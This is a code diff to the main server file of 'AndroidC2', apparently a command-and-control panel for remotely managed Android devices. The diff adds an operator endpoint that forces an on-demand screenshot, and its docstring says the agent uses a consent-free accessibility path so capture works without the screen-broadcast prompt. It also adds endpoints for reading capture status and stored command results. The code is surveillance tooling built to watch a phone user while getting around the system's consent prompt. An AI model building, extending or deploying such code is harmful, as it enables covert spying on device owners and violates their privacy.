@@ -1,5 +1,6 @@
 """AndroidC2 — main entry point."""
 
+import json
 import os
 import secrets
 import shutil
@@ -20,7 +21,7 @@ from sqlalchemy import update
 
 from config import Config
 
-from c2.agent_api import agent_api
+from c2.agent_api import RESULT_MAX_CHARS, agent_api
 from c2.agent_ws import (
     agent_online,
     register_agent_ws,
@@ -469,11 +470,11 @@ def create_app(start_background: bool = True):
                 .order_by(Command.created_at.desc()).limit(200).all())
         return jsonify([c.to_dict() for c in cmds])
 
-    def _queue_command(dev_id: int):
+    def _queue_command(dev_id: int, forced: dict | None = None):
         dev = db.get_or_404(Device, dev_id)
         body = request.get_json(silent=True) or {}
-        ctype = body.get("type")
-        args = body.get("args") or {}
+        ctype = forced["type"] if forced else body.get("type")
+        args = forced["args"] if forced else (body.get("args") or {})
         if not isinstance(args, dict):
             return jsonify({"error": "bad_args"}), 400
         if ctype not in COMMAND_CATALOG:
@@ -598,6 +599,72 @@ def create_app(start_background: bool = True):
         if err:
             return err
         return send_file(safe, mimetype=cf.mime_type)
+
+    @app.route("/api/device/<int:dev_id>/capture", methods=["POST"])
+    @operator_required
+    @csrf_protect
+    def api_capture(dev_id):
+        """Ask the device for a screenshot now.
+
+        The agent tries the consent-free accessibility path first and falls back
+        to MediaProjection, so this works without the screen-broadcast prompt.
+        Which path actually ran is in the result payload's `source` field, and
+        the panel surfaces it.
+        """
+        return _queue_command(dev_id, forced={"type": "screenshot", "args": {}})
+
+    @app.route("/api/device/<int:dev_id>/capture/status")
+    @operator_required
+    def api_capture_status(dev_id):
+        """Which capture paths this device can currently use.
+
+        Read-only: returns the most recent screenshot_status result if one has
+        landed, so the panel can distinguish "not enabled yet" from "failed".
+        """
+        db.get_or_404(Device, dev_id)
+        cmd = (Command.query
+               .filter_by(device_id=dev_id, command_type="screenshot_status",
+                          status="done")
+               .order_by(Command.completed_at.desc()).first())
+        if not cmd:
+            return jsonify({"error": "no_status"}), 404
+        try:
+            return jsonify({"status": json.loads(cmd.result or "{}")})
+        except (ValueError, TypeError):
+            return jsonify({"status": {"raw": cmd.result}})
+
+    @app.route("/api/device/<int:dev_id>/command/<int:cmd_id>")
+    @operator_required
+    def api_command_result(dev_id, cmd_id):
+        """One command's stored result, for the panel's result viewer.
+
+        Sequentially allocated ids mean existence is not authorisation, so the
+        device is checked the same way agent_api scopes it.
+        """
+        db.get_or_404(Device, dev_id)
+        cmd = db.get_or_404(Command, cmd_id)
+        if cmd.device_id != dev_id:
+            return jsonify({"error": "unknown_command"}), 404
+        try:
+            result = json.loads(cmd.result) if cmd.result else {}
+        except (ValueError, TypeError):
+            result = {"raw": cmd.result}
+        # json.loads("null") is None, not {}. The panel expects an object and
+        # would render "null" where an empty result should read as empty.
+        if not isinstance(result, dict):
+            result = {"value": result}
+        return jsonify({
+            "id": cmd.id,
+            "type": cmd.command_type,
+            "status": cmd.status,
+            "args": cmd.args(),
+            "result": result,
+            "truncated": cmd.result is not None
+                           and len(cmd.result) >= RESULT_MAX_CHARS,
+            "created_at": cmd.created_at.isoformat() if cmd.created_at else None,
+            "completed_at": (cmd.completed_at.isoformat()
+                             if cmd.completed_at else None),
+        })
 
     @app.route("/api/device/<int:dev_id>/upload_to_agent", methods=["POST"])
     @operator_required
